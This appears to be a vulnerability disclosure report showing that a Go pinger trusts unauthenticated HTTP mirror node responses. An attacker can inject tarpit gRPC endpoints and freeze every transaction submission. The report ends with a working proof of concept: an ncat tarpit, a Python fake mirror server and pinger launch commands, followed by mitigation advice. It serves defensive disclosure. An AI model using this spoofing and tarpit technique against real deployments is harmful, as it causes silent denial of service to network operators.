### Title
Unauthenticated Mirror Node Response Injects Tarpit gRPC Endpoints, Freezing All Transaction Submissions

### Summary
`fetchMirrorNodeNetwork()` in `pinger/mirror_node_client.go` blindly trusts any `service_endpoints` host/port returned in a mirror node HTTP response, performing no allowlist or IP-range validation. Because the documented transport is plain HTTP (`http://mirror-rest:5551`) with no TLS enforcement, a network-level attacker can MITM the response and inject tarpit gRPC endpoints. The SDK client is then built from those endpoints with no gRPC connection timeout, and `Execute(client)` in `transfer.go` is called without a context deadline, causing every transaction submission to hang indefinitely.

### Finding Description

**Code path and root cause:**

`pinger/mirror_node_client.go` lines 113–124 — the only validation applied to each `ServiceEndpoint` is that `host` is non-empty and `port != 0`:

```go
for _, ep := range n.ServiceEndpoints {
    host := strings.TrimSpace(ep.DomainName)
    if host == "" {
        host = strings.TrimSpace(ep.IPAddressV4)
    }
    if host == "" || ep.Port == 0 {   // ← sole guard
        continue
    }
    addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
    network[addr] = nodeAccountId     // ← arbitrary attacker-controlled addr
}
``` [1](#0-0) 

No IP allowlist, no RFC-1918 block, no hostname validation, no TLS enforcement on the upstream HTTP fetch. The HTTP client is constructed with only a read timeout:

```go
httpClient := &http.Client{Timeout: cfg.mirrorNodeClientTimeout}
``` [2](#0-1) 

The status-code check (lines 90–93) only rejects non-2xx responses — a crafted 200 passes unconditionally: [3](#0-2) 

The resulting network map is fed directly to the SDK with no timeout configured on the client:

```go
client = hiero.ClientForNetwork(netmap)
``` [4](#0-3) 

In `transfer.go`, `Execute` is called without propagating any context deadline:

```go
resp, err := cryptoTransfer.Execute(client)
``` [5](#0-4) 

The `ctx.Err()` check at line 24 only fires *between* attempts, not *during* a hanging `Execute` call: [6](#0-5) 

**Exploit flow:**

1. Attacker positions as a network-level MITM on the HTTP channel between the pinger and the mirror REST endpoint (feasible because the documented/default URL is `http://mirror-rest:5551` — plain HTTP).
2. Intercepts the GET `/api/v1/network/nodes` request and returns:
   ```json
   {
     "nodes": [{
       "node_account_id": "0.0.3",
       "service_endpoints": [{"ip_address_v4": "<tarpit-ip>", "port": 50211}]
     }],
     "links": {"next": null}
   }
   ```
3. `fetchMirrorNodeNetwork()` accepts this: valid `NodeAccountID`, non-empty host, non-zero port — all guards pass, `len(network) == 1 > 0`.
4. `hiero.ClientForNetwork(netmap)` builds the SDK client pointing exclusively at the tarpit.
5. Every `cryptoTransfer.Execute(client)` call blocks indefinitely waiting for a gRPC connection that never completes.
6. The retry loop in `submitWithRetry` never advances past the first `Execute`, and the ticker-driven transfer loop is permanently stalled.

### Impact Explanation

All transaction submissions are frozen for the lifetime of the process. The pinger's liveness heartbeat (`/tmp/alive`) continues to be written by a separate goroutine, so the Kubernetes exec probe does not detect the hang — the pod appears healthy while being completely non-functional. An attacker can sustain this freeze by keeping the tarpit alive, achieving a persistent, silent denial-of-service against the pinger's monitoring and transaction-submission function. [7](#0-6) 

### Likelihood Explanation

The precondition is a network-level MITM on a plain-HTTP connection. This is realistic in:
- Cloud/container environments where the mirror REST service is on an internal HTTP endpoint (the documented example `http://mirror-rest:5551` is HTTP).
- Shared-network deployments susceptible to ARP spoofing or rogue DHCP.
- Environments where DNS for the mirror REST hostname is attacker-influenced.

No credentials, no privileged keys, and no access to the pinger host are required — only the ability to intercept one unauthenticated HTTP response at startup. [8](#0-7) 

### Recommendation

1. **Enforce HTTPS** for the mirror REST URL: reject any `cfg.mirrorRest` that does not use the `https` scheme, or configure the `http.Client` with a TLS-only transport.
2. **Validate ServiceEndpoint addresses** against a configurable allowlist of known-good IP ranges or hostnames before adding them to the network map.
3. **Set a gRPC connection timeout** on the SDK client after `hiero.ClientForNetwork(netmap)` (e.g., `client.SetMaxNodeAttempts` / transport-level dial timeout).
4. **Propagate context with deadline** into `Execute`: use `cryptoTransfer.ExecuteWithContext(ctx, client)` (or equivalent) so that a cancellation or deadline interrupts a hanging gRPC dial, not just the inter-attempt sleep. [9](#0-8) 

### Proof of Concept

```
# 1. Start a tarpit (accepts TCP, never responds)
ncat -l 0.0.0.0 50211 -k &   # or use `tc netem` to drop ACKs

# 2. Stand up a fake mirror REST server on port 5551
python3 -c "
import http.server, json
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps({'nodes':[{'node_account_id':'0.0.3',
            'service_endpoints':[{'ip_address_v4':'<tarpit-ip>','port':50211}]}],
            'links':{'next':None}}).encode()
        self.send_response(200)
        self.send_header('Content-Type','application/json')
        self.end_headers()
        self.wfile.write(body)
http.server.HTTPServer(('0.0.0.0',5551),H).serve_forever()
"

# 3. Launch pinger pointing at the fake mirror
HIERO_MIRROR_PINGER_NETWORK=other \
HIERO_MIRROR_PINGER_REST=http://<attacker-ip>:5551 \
HIERO_MIRROR_PINGER_OPERATOR_ID=0.0.2 \
HIERO_MIRROR_PINGER_OPERATOR_KEY=<any-valid-key> \
./pinger

# Expected result:
# - pinger starts, builds network map from tarpit address (no error)
# - every Execute() call hangs indefinitely
# - /tmp/alive is still updated (liveness probe passes)
# - no transactions are ever submitted
```
